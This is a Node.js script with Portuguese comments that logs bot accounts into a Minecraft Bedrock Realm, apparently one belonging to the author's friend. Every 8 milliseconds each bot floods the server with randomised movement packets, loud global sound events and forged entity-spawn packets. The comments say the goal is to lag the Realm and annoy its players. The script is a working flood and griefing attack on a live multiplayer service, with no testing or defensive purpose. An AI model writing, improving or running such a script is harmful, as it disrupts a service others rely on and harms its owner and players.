const bedrock = require('bedrock-protocol');

async function startBots() {
    const numBots = 2; // Começa baixo, aumenta depois

    for (let i = 0; i < numBots; i++) {
        setTimeout(() => {
            const client = bedrock.createClient({
                username: `LagDemon${i}_${Math.floor(Math.random() * 99999)}`,
                offline: false,           // Conta Microsoft
                realms: {
                    pickRealm: (realms) => realms[0]  // Pega o primeiro Realm (o do seu amigo)
                },
                version: "26.2",       // Ajusta pra versão do Realm
            });

            client.on('join', () => {
                console.log(`[Bot ${i}] Entrou no Realm! Começando o cancer...`);
                
                setInterval(() => {
                    // Movement spam
                    client.write('player_auth_input', {
                        position: {
                            x: Math.random() * 600 - 300,
                            y: 60 + Math.random() * 80,
                            z: Math.random() * 600 - 300
                        },
                        rotation: { x: Math.random() * 360, y: Math.random() * 180 - 90 },
                        motion: { x: Math.random() * 4 - 2, y: Math.random() * 2 - 1, z: Math.random() * 4 - 2 },
                        input_flags: 0xFFFFFFFFFFFFFFFFn,
                    });

                    // Sound spam (o que mais fode)
                    client.write('level_sound_event', {
                        sound_id: Math.random() > 0.5 ? 120 : 65,
                        position: { x: 0, y: 80, z: 0 },
                        volume: 10,
                        pitch: Math.random() * 2,
                        is_global: true
                    });

                    // Entity spam
                    if (Math.random() > 0.6) {
                        client.write('add_entity', {
                            runtime_id: Math.floor(Math.random() * 9000000) + 100000,
                            entity_type: "minecraft:zombie",
                            position: { x: Math.random() * 40 - 20, y: 70, z: Math.random() * 40 - 20 }
                        });
                    }
                }, 8); // quanto menor, mais pesado
            });

            client.on('disconnect', (reason) => {
                console.log(`[Bot ${i}] Caiu: ${reason}`);
            });

        }, i * 800); // delay entre bots
    }
}

startBots();